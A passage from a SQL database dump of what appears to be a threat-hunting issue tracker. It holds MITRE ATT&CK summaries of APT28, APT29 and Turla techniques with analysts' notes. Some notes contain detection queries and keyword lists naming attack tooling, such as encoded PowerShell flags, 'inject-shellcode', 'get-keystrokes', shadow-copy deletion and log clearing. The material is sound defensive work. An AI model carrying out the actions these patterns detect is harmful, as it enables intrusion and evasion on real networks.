hunt\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>'),(361,381,'attr','description','APT28 has used several malicious applications that abused OAuth access tokens to gain access to target email accounts, including Gmail and Yahoo Mail.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID. Observe possible use of access outside of duty hours to assist in ID.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/001/\r\n\r\n</pre>','Adversaries may use stolen application access tokens to bypass the typical authentication process and access restricted accounts, information, or services on remote systems. These tokens are typically stolen from users and used in lieu of login credentials.\r\n\r\nApplication access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS). OAuth is one commonly implemented framework that issues tokens to users for access to systems. These frameworks are used collaboratively to verify the user and determine what actions the user is allowed to perform. Once identity is established, the token allows actions to be authorized, without passing the actual credentials of the user. Therefore, compromise of the token can grant the adversary access to resources of other sites through a malicious application.\r\n\r\nFor example, with a cloud-based email service once an OAuth access token is granted to a malicious application, it can potentially gain long-term access to features of the user account if a \"refresh\" token enabling background access is awarded.[3] With an OAuth access token an adversary can use the user-granted REST API to perform functions such as email searching and contact enumeration.[4]\r\n\r\nCompromised access tokens may be used as an initial step in compromising other services. For example, if a token grants access to a victim’s primary email, the adversary may be able to extend access to all other services which the target subscribes by triggering forgotten password routines. Direct API access through a token negates the effectiveness of a second authentication factor and may be immune to intuitive countermeasures like changing passwords. Access abuse over an API channel can be difficult to detect even from the service provider end, as the access can still align well with a legitimate workflow.\r\n\r\n<pre>\r\nHunter Notes:\r\nWould REALLY be hard to ID. Observe possible use of access outside of duty hours to assist in ID.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550/001/\r\n\r\n</pre>'),(362,382,'attr','description','Turla has used encryption (including salted 3DES via PowerSploit\'s Out-EncryptedScript.ps1), random variable names, and base64 encoding to obfuscate PowerShell commands and payloads.\r\n\r\n<pre>\r\nHunter Notes:\r\nFile or information will be layered with obfuscation and encoding to blend in with traffic.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1027/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1027+-+Obfuscated+Files+or+Information https://confluence.di2e.net/pages/viewpage.action?pageId=1173888572&src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1132.001%3A+Data+Encoding-+Standard+Encoding\r\n</pre>','Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.\r\n\r\nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user\'s action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also used compressed or archived scripts, such as JavaScript.\r\n\r\nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \r\n\r\nAdversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.\r\n\r\n<pre>\r\nHunter Notes:\r\nFile or information will be layered with obfuscation and encoding to blend in with traffic.\r\n</pre>\r\n\r\n<pre>\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1027/\r\nhttps://confluence.di2e.net/display/CYH836/APT+Turla+-+T1027+-+Obfuscated+Files+or+Information https://confluence.di2e.net/pages/viewpage.action?pageId=1173888572&src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1132.001%3A+Data+Encoding-+Standard+Encoding\r\n</pre>'),(363,383,'attr','description','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla+-+T1570+-+Lateral+Tool+Transfer\r\n</pre>\r\n','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nRPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla+-+T1570+-+Lateral+Tool+Transfer\r\n</pre>\r\n');
/*!40000 ALTER TABLE `journal_details` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `journals`
--

DROP TABLE IF EXISTS `journals`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `journals` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `journalized_id` int(11) NOT NULL DEFAULT '0',
  `journalized_type` varchar(30) NOT NULL DEFAULT '',
  `user_id` int(11) NOT NULL DEFAULT '0',
  `notes` longtext,
  `created_on` datetime NOT NULL,
  `private_notes` tinyint(1) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `journals_journalized_id` (`journalized_id`,`journalized_type`),
  KEY `index_journals_on_user_id` (`user_id`),
  KEY `index_journals_on_journalized_id` (`journalized_id`),
  KEY `index_journals_on_created_on` (`created_on`)
) ENGINE=InnoDB AUTO_INCREMENT=387 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `journals`
--

LOCK TABLES `journals` WRITE;
/*!40000 ALTER TABLE `journals` DISABLE KEYS */;
INSERT INTO `journals` VALUES (1,2,'Issue',1,'','2021-01-27 17:04:30',0),(2,3,'Issue',1,'','2021-01-27 17:04:33',0),(3,4,'Issue',1,'','2021-01-27 17:04:35',0),(4,1,'Issue',1,'','2021-01-27 17:04:41',0),(5,4,'Issue',1,'','2021-01-27 17:05:25',0),(6,2,'Issue',1,'','2021-01-27 17:06:14',0),(7,3,'Issue',1,'','2021-01-27 17:06:27',0),(8,1,'Issue',1,'','2021-01-27 17:06:51',0),(9,5,'Issue',1,'','2021-01-27 17:07:16',0),(10,8,'Issue',1,'','2021-01-27 17:13:30',0),(11,9,'Issue',1,'','2021-01-27 17:14:43',0),(12,28,'Issue',1,'','2021-01-27 17:47:05',0),(13,28,'Issue',1,'','2021-01-27 17:47:32',0),(14,39,'Issue',1,'','2021-01-27 18:08:20',0),(15,50,'Issue',1,'','2021-01-27 18:17:16',0),(16,51,'Issue',1,'','2021-01-27 18:17:28',0),(17,50,'Issue',1,'','2021-01-27 18:23:00',0),(18,47,'Issue',1,'','2021-01-27 18:23:13',0),(19,45,'Issue',1,'','2021-01-27 18:23:31',0),(20,41,'Issue',1,'','2021-01-27 18:23:46',0),(21,38,'Issue',1,'','2021-01-27 18:24:03',0),(22,30,'Issue',1,'','2021-01-27 18:24:21',0),(23,26,'Issue',1,'','2021-01-27 18:24:47',0),(24,29,'Issue',1,'','2021-01-27 18:25:06',0),(25,9,'Issue',1,'','2021-01-27 18:25:23',0),(26,5,'Issue',1,'','2021-01-27 18:25:37',0),(27,1,'Issue',1,'','2021-01-27 18:25:55',0),(28,29,'Issue',1,'','2021-01-27 18:41:02',0),(29,29,'Issue',1,'','2021-01-27 18:41:12',0),(30,4,'Issue',6,'','2021-01-28 19:52:28',0),(31,2,'Issue',6,'','2021-01-28 19:56:47',0),(33,2,'Issue',9,'','2021-01-28 20:59:15',0),(34,3,'Issue',9,'','2021-01-28 20:59:37',0),(35,4,'Issue',9,'','2021-01-28 20:59:56',0),(36,10,'Issue',9,'','2021-01-28 21:04:04',0),(37,13,'Issue',9,'','2021-01-28 21:04:53',0),(38,14,'Issue',9,'','2021-01-28 21:05:20',0),(39,15,'Issue',9,'','2021-01-28 21:05:55',0),(40,23,'Issue',9,'','2021-01-28 21:06:18',0),(41,21,'Issue',9,'','2021-01-28 21:06:36',0),(42,20,'Issue',9,'','2021-01-28 21:07:16',0),(43,19,'Issue',9,'','2021-01-28 21:07:47',0),(44,2,'Issue',6,'','2021-01-28 21:07:58',0),(46,17,'Issue',9,'','2021-01-28 21:08:57',0),(47,16,'Issue',9,'','2021-01-28 21:09:24',0),(49,12,'Issue',9,'','2021-01-28 21:12:27',0),(50,11,'Issue',9,'','2021-01-28 21:12:48',0),(51,31,'Issue',9,'','2021-01-28 21:13:57',0),(52,33,'Issue',9,'','2021-01-28 21:15:01',0),(53,34,'Issue',9,'','2021-01-28 21:15:40',0),(54,37,'Issue',9,'','2021-01-28 21:16:11',0),(55,3,'Issue',6,'','2021-01-28 21:16:22',0),(56,36,'Issue',9,'','2021-01-28 21:16:36',0),(57,49,'Issue',9,'','2021-01-28 21:19:20',0),(58,48,'Issue',9,'','2021-01-28 21:19:35',0),(59,44,'Issue',9,'','2021-01-28 21:20:07',0),(60,51,'Issue',9,'','2021-01-28 21:20:36',0),(61,46,'Issue',9,'','2021-01-28 21:20:54',0),(62,2,'Issue',9,'','2021-01-28 21:24:52',0),(63,4,'Issue',6,'','2021-01-28 21:28:55',0),(65,10,'Issue',1,'','2021-01-28 21:33:32',0),(66,27,'Issue',1,'','2021-01-28 21:41:12',0),(67,27,'Issue',1,'','2021-01-28 21:42:52',0),(68,11,'Issue',1,'','2021-01-28 21:43:01',0),(69,1,'Issue',1,'','2021-04-16 15:57:34',0),(71,5,'Issue',5,'','2021-04-16 16:04:05',0),(72,9,'Issue',5,'','2021-04-16 16:04:43',0),(73,26,'Issue',5,'','2021-04-16 16:05:39',0),(74,30,'Issue',5,'','2021-04-16 16:06:02',0),(75,38,'Issue',5,'','2021-04-16 16:06:32',0),(76,41,'Issue',5,'','2021-04-16 16:06:59',0),(77,45,'Issue',5,'','2021-04-16 16:07:26',0),(78,47,'Issue',5,'','2021-04-16 16:07:57',0),(79,50,'Issue',5,'','2021-04-16 16:08:26',0),(80,2,'Issue',1,'','2021-04-16 16:13:45',0),(81,4,'Issue',1,'','2021-04-16 16:14:22',0),(82,6,'Issue',1,'','2021-04-16 16:14:30',0),(83,7,'Issue',1,'','2021-04-16 16:16:01',0),(84,8,'Issue',1,'','2021-04-16 16:16:23',0),(85,52,'Issue',1,'','2021-04-16 16:16:28',0),(86,53,'Issue',1,'','2021-04-16 16:16:33',0),(87,54,'Issue',1,'','2021-04-16 16:16:38',0),(88,10,'Issue',1,'','2021-04-16 16:18:25',0),(89,11,'Issue',1,'','2021-04-16 16:18:30',0),(90,12,'Issue',1,'','2021-04-16 16:18:37',0),(92,22,'Issue',1,'','2021-04-16 16:19:19',0),(93,24,'Issue',1,'','2021-04-16 16:19:24',0),(94,25,'Issue',1,'','2021-04-16 16:19:29',0),(95,55,'Issue',1,'','2021-04-16 16:19:33',0),(96,31,'Issue',1,'','2021-04-16 16:19:55',0),(97,33,'Issue',1,'','2021-04-16 16:20:00',0),(98,34,'Issue',1,'','2021-04-16 16:20:06',0),(99,36,'Issue',1,'','2021-04-16 16:20:25',0),(100,37,'Issue',1,'','2021-04-16 16:20:32',0),(101,44,'Issue',1,'','2021-04-16 16:20:59',0),(102,46,'Issue',1,'','2021-04-16 16:21:07',0),(103,48,'Issue',1,'','2021-04-16 16:21:37',0),(104,48,'Issue',1,'','2021-04-16 16:21:42',0),(105,59,'Issue',6,'','2021-04-16 16:21:43',0),(106,49,'Issue',1,'','2021-04-16 16:21:54',0),(107,51,'Issue',1,'','2021-04-16 16:22:07',0),(109,10,'Issue',5,'','2021-04-16 16:48:54',0),(110,51,'Issue',5,'','2021-04-16 17:00:44',0),(111,49,'Issue',5,'','2021-04-16 17:03:07',0),(112,46,'Issue',5,'','2021-04-16 17:04:42',0),(113,42,'Issue',5,'','2021-04-16 17:06:21',0),(114,43,'Issue',5,'','2021-04-16 17:07:16',0),(115,44,'Issue',5,'','2021-04-16 17:08:37',0),(116,4,'Issue',1,'','2021-04-16 17:10:03',0),(117,4,'Issue',1,'','2021-04-16 17:10:16',0),(118,4,'Issue',1,'','2021-04-16 17:10:57',0),(119,15,'Issue',6,'','2021-04-16 17:11:00',0),(120,39,'Issue',5,'','2021-04-16 17:11:02',0),(121,3,'Issue',1,'','2021-04-16 17:11:37',0),(122,2,'Issue',1,'','2021-04-16 17:12:10',0),(123,40,'Issue',5,'','2021-04-16 17:12:10',0),(124,54,'Issue',1,'','2021-04-16 17:12:53',0),(125,15,'Issue',6,'','2021-04-16 17:13:42',0),(126,31,'Issue',5,'','2021-04-16 17:14:25',0),(127,32,'Issue',5,'','2021-04-16 17:15:33',0),(128,53,'Issue',1,'','2021-04-16 17:17:15',0),(129,52,'Issue',1,'','2021-04-16 17:17:49',0),(130,8,'Issue',1,'','2021-04-16 17:18:17',0),(131,55,'Issue',6,'','2021-04-16 17:18:35',0),(132,33,'Issue',5,'','2021-04-16 17:20:40',0),(133,34,'Issue',5,'','2021-04-16 17:21:23',0),(134,35,'Issue',5,'','2021-04-16 17:22:15',0),(135,7,'Issue',1,'','2021-04-16 17:22:33',0),(136,36,'Issue',5,'','2021-04-16 17:23:02',0),(137,6,'Issue',1,'','2021-04-16 17:23:05',0),(138,37,'Issue',5,'','2021-04-16 17:23:44',0),(139,25,'Issue',1,'','2021-04-16 17:23:52',0),(140,24,'Issue',1,'','2021-04-16 17:24:22',0),(141,27,'Issue',5,'','2021-04-16 17:24:41',0),(142,23,'Issue',1,'','2021-04-16 17:25:06',0),(143,22,'Issue',1,'','2021-04-16 17:25:41',0),(144,28,'Issue',5,'','2021-04-16 17:26:08',0),(145,21,'Issue',1,'','2021-04-16 17:26:19',0),(146,20,'Issue',1,'','2021-04-16 17:26:56',0),(147,10,'Issue',6,'','2021-04-16 17:27:37',0),(148,14,'Issue',1,'','2021-04-16 17:27:56',0),(149,13,'Issue',1,'','2021-04-16 17:28:37',0),(150,29,'Issue',5,'','2021-04-16 17:29:00',0),(151,12,'Issue',1,'','2021-04-16 17:29:02',0),(152,11,'Issue',5,'','2021-04-16 17:30:45',0),(153,19,'Issue',1,'','2021-04-16 17:30:56',0),(154,17,'Issue',5,'','2021-04-16 17:31:46',0),(159,71,'Issue',1,'','2021-05-05 18:11:43',0),(163,75,'Issue',1,'','2021-05-05 18:17:10',0),(164,71,'Issue',1,'','2021-05-05 18:18:32',0),(165,77,'Issue',1,'','2021-05-05 18:20:00',0),(167,80,'Issue',1,'APT29 used WMI to steal credentials and execute backdoors at a future time.\r\n\r\nTurla and its RPC backdoors have used APIs calls for various tasks related to subverting AMSI and accessing then executing commands through RPC and/or named pipes.','2021-05-05 18:26:15',0),(168,82,'Issue',1,'','2021-05-05 18:35:34',0),(169,83,'Issue',1,'','2021-05-05 18:36:11',0),(170,83,'Issue',1,'','2021-05-05 18:41:56',0),(171,85,'Issue',1,'','2021-05-05 18:42:22',0),(173,86,'Issue',1,'','2021-05-05 18:46:07',0),(174,83,'Issue',1,'','2021-05-05 18:58:13',0),(175,92,'Issue',1,'','2021-05-05 18:58:30',0),(176,83,'Issue',1,'','2021-05-05 19:00:30',0),(177,2,'Issue',1,'','2021-05-05 19:13:32',0),(178,2,'Issue',1,'','2021-05-05 19:14:46',0),(179,85,'Issue',1,'','2021-05-05 19:33:03',0),(180,93,'Issue',1,'','2021-05-05 19:37:19',0),(181,91,'Issue',1,'','2021-05-05 19:41:43',0),(182,98,'Issue',1,'','2021-05-05 20:04:49',0),(183,99,'Issue',1,'','2021-05-05 20:06:50',0),(184,98,'Issue',1,'','2021-05-05 20:09:39',0),(185,98,'Issue',1,'','2021-05-05 20:11:00',0),(186,95,'Issue',1,'','2021-05-05 20:11:26',0),(188,71,'Issue',1,'','2021-05-06 14:04:08',0),(193,80,'Issue',1,'','2021-05-06 14:15:42',0),(194,71,'Issue',1,'','2021-05-06 14:15:53',0),(198,71,'Issue',1,'','2021-05-06 14:21:38',0),(203,101,'Issue',1,'','2021-05-06 14:23:32',0),(205,46,'Issue',1,'','2021-05-06 14:24:20',0),(207,83,'Issue',1,'','2021-05-06 14:26:42',0),(208,83,'Issue',1,'','2021-05-06 14:28:13',0),(210,83,'Issue',1,'','2021-05-06 14:28:52',0),(214,91,'Issue',1,'','2021-05-06 14:31:46',0),(215,91,'Issue',1,'','2021-05-06 14:32:36',0),(217,91,'Issue',1,'','2021-05-06 14:33:34',0),(222,46,'Issue',1,'','2021-05-06 14:35:22',0),(223,113,'Issue',1,'','2021-05-06 14:35:22',0),(224,114,'Issue',1,'','2021-05-06 14:42:04',0),(225,114,'Issue',1,'','2021-05-06 14:43:33',0),(228,101,'Issue',1,'APT 29 used WMI to steal credentials and execute backdoors at a future time.\n\nEventID : (19 OR 20 OR 21)  AND Channel : *sysmon* AND NOT (Whitelist)\n\n (Youll have to white list known good)','2021-05-06 14:46:21',0),(229,123,'Issue',1,'','2021-05-06 14:46:50',0),(230,117,'Issue',1,'used cmd.exe to execute commands on remote machines\n\nEventID :  (1 OR 800 OR 4103 OR 4104 OR 4688) AND (cmd.exe and powershell.exe) OR (cmd.exe and *.vbs)','2021-05-06 14:46:54',0),(233,121,'Issue',1,'has used Cobalt Strike\n\nSigma rules: sysmon_cobaltstrike_process_injection.yml win_meterpreter_or_cobaltstrike_getsystem_service_installation.yml win_meterpreter_or_cobaltstrike_getsystem_service_start.yml','2021-05-06 14:48:11',0),(234,2,'Issue',1,'','2021-05-06 14:48:20',0),(235,125,'Issue',1,'','2021-05-06 14:51:42',0),(236,126,'Issue',1,'APT28 downloads and executes PowerShell scripts.\n\n<pre>\nEventID : 1 AND Image : *Powershell* AND (CommandLine : \"* -enc*\" OR CommandLine : \"* -en *\" OR CommandLine : \"* -ec *\" OR CommandLine : \"* -e *\")\nEventID : 1 AND Image : *Powershell* AND (CommandLine : \"*-iex*\" OR *-invoke-expression*)\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\" OR \"get-screenshot\" OR ‘invoke-PSImage”\n\n*This is a general query for dangerous powershell modules\n\n(Playbook) T1059 - Command and Scripting Interpreter\n</pre>','2021-05-06 14:53:16',0),(237,127,'Issue',1,'','2021-05-06 14:55:31',0),(239,59,'Issue',1,'','2021-05-06 15:02:21',0),(241,130,'Issue',1,'<pre>\r\nEventID : 2 \r\n\r\nFilter out RuntimeBroker.exe, backgroundTaskHost.exe and other confirmed good executables.\r\nSigma rule w/ Elastalert\r\n\r\n</pre>','2021-05-06 15:06:44',0),(242,2,'Issue',1,'<pre>\r\nEvent ID : 4769 (Look for excessive requests/mistypes/RC4 encryption)\r\n</pre>','2021-05-06 15:08:08',0),(243,130,'Issue',1,'','2021-05-06 15:08:41',0),(244,86,'Issue',1,'<pre>\r\nEvent ID: 4624;type3,10;session key length = 0\r\nFlorian Roth Sigma Rule: Windows/builtin/pass_the_hash\r\n</pre> ','2021-05-06 15:09:15',0),(245,4,'Issue',1,'<pre>\n- Has used Psexec for lateral movement\nEventID : 17 and psexecsvc\nPsexec hunting playbook\nhttps://confluence.di2e.net/display/NCPT/Detecting+PsExec\n\n- Has used Winexec for lateral movement\nEventID: 17 - Least Frequency Analysis. Further Testing....\n\n- Has used RemCOm for lateral movement\nEventID : 17 and remcom\n</pre>','2021-05-06 15:10:00',0),(246,32,'Issue',1,'<pre>\nused AUDITPOL to prevent the collection of audit logs\n \nused netsh to configure firewall rules that limited certain UDP outbound packets.\n\nused the service control manager on a remote system to disable services associated with security monitoring products.\n\nhas performed timestomping on victim files.\n\nnamed tasks \\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager in order to appear legitimate\n\nhas used Rundll32.exe to execute payloads\n\nobtained Ticket Granting Service (TGS) tickets for Active Directory Service Principle Names to crack offline\n\n(EventID : 1 AND Description : \"Secure file delete\") OR (EventID : 1 AND IMAGE : wmic.exe AND CommandLine : shadowcopy AND Commandline : delete) OR (EventID : 1 AND IMAGE : cmd.exe AND CommandLine : del) OR (EventID : 1 AND IMAGE : bcdedit.exe AND CommandLine : *) OR (EventID : 1 AND IMAGE : wbadmin.exe AND CommandLine : Delete) OR (EventID:1 AND desc: ccleaner.exe) OR (EventID:23)\n\n\n</pre>','2021-05-06 15:12:35',0),(247,132,'Issue',1,'Turla has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire\'s PSInject. Turla has also used PowerShell scripts to load and execute malware in memory.\n<pre>\n\nEventID : 1 and .vbs or cmd.exe\n\nEventID : 1 AND Image : *Powershell* AND (CommandLine : \"* -enc*\" OR CommandLine : \"* -en *\" OR CommandLine : \"* -ec *\" OR CommandLine : \"* -e *\")\n</pre>','2021-05-06 15:13:46',0),(248,132,'Issue',1,'','2021-05-06 15:14:28',0),(249,131,'Issue',1,'','2021-05-06 15:14:40',0),(250,131,'Issue',1,'','2021-05-06 15:14:57',0),(251,131,'Issue',1,'','2021-05-06 15:15:15',0),(252,131,'Issue',1,'','2021-05-06 15:15:28',0),(253,134,'Issue',1,' Turla RPC backdoors have used cmd.exe to execute commands.\r\n<pre>\r\nEventID : 1 and .vbs or cmd.exe\r\n\r\nEventID : 1 AND Image : *Powershell* AND (CommandLine : \"* -enc*\" OR CommandLine : \"* -en *\" OR CommandLine : \"* -ec *\" OR CommandLine : \"* -e *\")\r\n</pre>','2021-05-06 15:16:47',0),(254,92,'Issue',1,'<pre>\nused net use commands to connect to lateral systems within a network.\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net use\")\n</pre>','2021-05-06 15:18:25',0),(255,92,'Issue',1,'','2021-05-06 15:19:33',0),(256,59,'Issue',1,'<pre>\nRPC backdoors can be used to transfer files to/from victim machines on the local network.\nEventID : 17\n(Frequency of least occurance)\n</pre>','2021-05-06 15:20:35',0),(257,135,'Issue',1,'','2021-05-06 15:20:47',0),(258,133,'Issue',1,'','2021-05-06 15:22:28',0),(259,135,'Issue',1,'','2021-05-06 15:22:58',0),(260,136,'Issue',1,'','2021-05-06 15:22:58',0),(261,136,'Issue',1,'','2021-05-06 15:24:34',0),(262,138,'Issue',1,'','2021-05-06 15:24:34',0),(263,138,'Issue',1,'','2021-05-06 15:25:00',0),(264,137,'Issue',1,'<pre>\r\n(EventID : 1 OR 800 OR 4103 OR 4104) AND wevtutil*cl\r\nEventID: 1102\r\n\r\n</pre>\r\n','2021-05-06 15:26:41',0),(265,138,'Issue',1,'','2021-05-06 15:27:21',0),(266,139,'Issue',1,'','2021-05-06 15:27:21',0),(267,131,'Issue',1,'','2021-05-06 15:29:32',0),(268,141,'Issue',1,'','2021-05-06 15:29:32',0),(269,36,'Issue',1,'EventID : 1 AND *certutil*decode*\r\n','2021-05-06 15:31:19',0),(270,131,'Issue',1,'','2021-05-06 15:31:57',0),(271,99,'Issue',1,'Evt ID: 4624;type3,10 session key length = 0\r\nLow priority/likelihood unless gmail or yahoo is used for corporate email\r\n','2021-05-06 15:32:28',0),(272,96,'Issue',1,'(Playbook) T1221 - Template Injection\r\nOffice products spawning child processes such as Powershell or creating network connections. \r\n\r\n','2021-05-06 15:35:25',0),(273,139,'Issue',1,'','2021-05-06 15:37:42',0),(274,146,'Issue',1,'','2021-05-06 15:37:42',0),(275,59,'Issue',1,'','2021-05-06 15:39:56',0),(276,146,'Issue',1,'','2021-05-06 15:40:23',0),(277,147,'Issue',1,'','2021-05-06 15:40:23',0),(278,147,'Issue',1,'','2021-05-06 15:40:40',0),(279,141,'Issue',1,'','2021-05-06 15:43:19',0),(280,2,'Issue',1,'','2021-05-06 15:45:50',0),(281,141,'Issue',1,'','2021-05-06 15:45:54',0),(282,149,'Issue',1,'','2021-05-06 15:45:54',0),(283,148,'Issue',1,'','2021-05-06 15:45:59',0),(285,86,'Issue',1,'','2021-05-06 15:49:11',0),(286,150,'Issue',1,'','2021-05-06 15:50:56',0),(287,150,'Issue',1,'','2021-05-06 15:52:11',0),(288,4,'Issue',1,'','2021-05-06 15:53:23',0),(289,155,'Issue',1,' Turla has used VBS scripts throughout its operations.\r\n<pre>\r\nEventID : 1 and .vbs or cmd.exe\r\n\r\nEventID : 1 AND Image : *Powershell* AND (CommandLine : \"* -enc*\" OR CommandLine : \"* -en *\" OR CommandLine : \"* -ec *\" OR CommandLine : \"* -e *\")\r\n</pre>','2021-05-06 15:53:25',0),(290,154,'Issue',1,'','2021-05-06 15:53:35',0),(291,157,'Issue',1,'','2021-05-06 15:53:35',0),(292,151,'Issue',1,'','2021-05-06 15:54:00',0),(293,134,'Issue',1,'','2021-05-06 15:54:07',0),(294,132,'Issue',1,'','2021-05-06 15:54:30',0),(295,151,'Issue',1,'Visibility will be low, ask MSN partner if vulnerable to CVE-2015-1701\r\n\r\n','2021-05-06 15:54:42',0),(296,92,'Issue',1,'','2021-05-06 15:55:06',0),(297,157,'Issue',1,'','2021-05-06 15:55:07',0),(298,159,'Issue',1,'','2021-05-06 15:55:07',0),(299,152,'Issue',1,'','2021-05-06 15:55:41',0),(300,152,'Issue',1,'Low Vis, ask MSN partner if vulnerable to CVE-2015-4902\r\n','2021-05-06 15:56:18',0),(301,59,'Issue',1,'','2021-05-06 15:56:26',0),(302,159,'Issue',1,'','2021-05-06 15:56:43',0),(303,160,'Issue',1,'','2021-05-06 15:56:43',0),(304,153,'Issue',1,'Check for keys in the following location\r\nHKLM|HKCU)\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\CLSID\\\r\n{59031A47-3F72-44A7-80C5-5595FE6B30EE}\\Order\r\n','2021-05-06 15:56:58',0),(305,153,'Issue',1,'','2021-05-06 15:57:26',0),(306,156,'Issue',1,'','2021-05-06 15:58:17',0),(307,156,'Issue',1,'Sigma rule: sysmon_apt_turla_namedpipes.yml\r\nEventID : 17\r\n\r\n(Frequency of least occurance)\r\n','2021-05-06 15:58:24',0),(308,157,'Issue',1,'','2021-05-06 15:59:18',0),(309,158,'Issue',1,'<pre>\r\n(Sigma) windows/process_creation/win_powershell_amsi_bypass\r\n(Sigma) windows/other/win_defender_amsi_trigger\r\n(Playbook) T1562 - Impair Defenses\r\n\r\n</pre>\r\n','2021-05-06 15:59:46',0),(310,161,'Issue',1,'','2021-05-06 16:10:25',0),(311,161,'Issue',1,'','2021-05-06 16:13:38',0),(313,162,'Issue',1,'','2021-05-06 16:19:29',0),(314,160,'Issue',1,'','2021-05-06 17:46:39',0),(315,163,'Issue',1,'','2021-05-06 17:46:39',0),(316,162,'Issue',1,'may attempt to connect to systems within a victim\'s network using net use commands and a predefined list or collection of passwords.\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"net use\") - LOTS of occurances','2021-05-06 17:48:58',0),(317,163,'Issue',1,'','2021-05-06 17:49:11',0),(318,164,'Issue',1,'','2021-05-06 17:49:11',0),(319,164,'Issue',1,'','2021-05-06 17:51:08',0),(322,166,'Issue',1,'','2021-05-06 17:53:14',0),(323,166,'Issue',1,'','2021-05-06 17:55:58',0),(324,167,'Issue',1,'','2021-05-06 17:55:58',0),(327,167,'Issue',1,'','2021-05-06 18:02:10',0),(328,71,'Issue',1,'','2021-05-06 18:02:15',0),(329,87,'Issue',1,'','2021-05-06 18:05:35',0),(330,51,'Issue',1,'','2021-05-06 18:06:46',0),(331,83,'Issue',1,'','2021-05-06 18:06:49',0),(332,166,'Issue',1,'','2021-05-06 18:08:49',0),(333,85,'Issue',1,'','2021-05-06 18:10:26',0),(334,164,'Issue',1,'','2021-05-06 18:10:31',0),(335,93,'Issue',1,'','2021-05-06 18:11:58',0),(336,160,'Issue',1,'','2021-05-06 18:12:12',0),(337,93,'Issue',1,'','2021-05-06 18:12:49',0),(338,163,'Issue',1,'','2021-05-06 18:12:58',0),(339,160,'Issue',1,'','2021-05-06 18:14:06',0),(340,159,'Issue',1,'','2021-05-06 18:15:02',0),(341,159,'Issue',1,'','2021-05-06 18:15:27',0),(342,167,'Issue',1,'','2021-05-06 18:15:36',0),(343,168,'Issue',1,'','2021-05-06 18:15:36',0),(344,157,'Issue',1,'','2021-05-06 18:16:01',0),(345,157,'Issue',1,'','2021-05-06 18:16:28',0),(346,159,'Issue',1,'','2021-05-06 18:16:58',0),(347,154,'Issue',1,'','2021-05-06 18:17:05',0),(348,157,'Issue',1,'','2021-05-06 18:17:49',0),(349,131,'Issue',1,'','2021-05-06 18:18:36',0),(350,147,'Issue',1,'','2021-05-06 18:18:42',0),(351,168,'Issue',1,'','2021-05-06 18:19:31',0),(352,169,'Issue',1,'','2021-05-06 